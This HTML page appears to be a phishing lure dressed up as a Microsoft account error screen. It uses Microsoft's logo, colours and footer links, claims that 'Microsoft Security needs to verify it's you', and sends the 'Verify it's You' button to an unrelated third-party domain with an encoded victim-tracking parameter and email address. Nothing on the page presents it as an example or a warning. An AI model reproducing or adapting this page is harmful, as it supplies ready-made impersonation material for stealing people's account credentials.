
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Something went wrong</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin>
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="//aadcdn.msauth.net">
    <link rel="dns-prefetch" href="//aadcdn.msftauth.net">
    <meta name="PageID" content="ConvergedDownLevelError" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="1033" />
    <meta name="LocLC" content="en-US" />
    <link rel="shortcut icon" href="favicon.ico" />
    <link data-loader="cdn" crossorigin="anonymous" href="lincu.css" rel="stylesheet" />

    <style>
        /* Global Reset and Font */
        body, html {
            height: 100%;
            margin: 0;
            font-family: "Segoe UI", Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .outer {
            max-width: 500px;
            width: 100%;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .inner {
            padding: 20px;
        }

        img {
            width: 60px;
            margin-bottom: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .text-title {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .form-group {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
        }

        /* Microsoft Blue Button */
        button {
            background-color: #0078d4; /* Microsoft Blue */
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-transform: uppercase;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        }

        button:hover {
            background-color: #005bb5;
            box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.2);
        }

        .footer {
            text-align: center;
            font-size: 14px;
            padding: 20px;
            background-color: #f4f4f4;
        }

        .footer a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* High-Res SVG logo for crisp appearance */
        .logo {
            width: 160px;
            height: auto;
            margin-bottom: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="outer">
            <div class="inner">
                <!-- High-Resolution Microsoft logo -->
                <img class="logo" src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen-1920x706.jpg" alt="Microsoft Logo" />
                <div class="text-title">We can’t process your request</div>
                <div class="form-group">Your account is currently set to protect you.</div>
                <div class="form-group">Microsoft Security needs to verify it's you.</div>
                <!-- Button that triggers a link -->
                <a href=" https://adhanuartha.com/m/?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9V0hWNGIzWT0mdWlkPVVTRVIxNDEwMjAyNFUxNDEwMTQ0NQ==N0123N[EMAIL]
" target="_blank">
                    <button>Verify it’s You</button>
                </a>
            </div>
        </div>
    </div>

    <!-- Footer with Microsoft links -->
    <div class="footer">
        <div id="footerLinks" class="footerNode text-secondary">
            <a href="https://www.microsoft.com/en-us/servicesagreement" target="_blank">Terms of Use</a>
            <a href="https://privacy.microsoft.com/en-us/" target="_blank">Privacy &amp; Cookies</a>
            <a href="https://support.microsoft.com/en-us" target="_blank">Support</a>
            <a href="https://www.microsoft.com/en-us/accessibility" target="_blank">Accessibility</a>
            <a href="https://account.microsoft.com" target="_blank">Account</a>
        </div>
    </div>
</body>

</html>
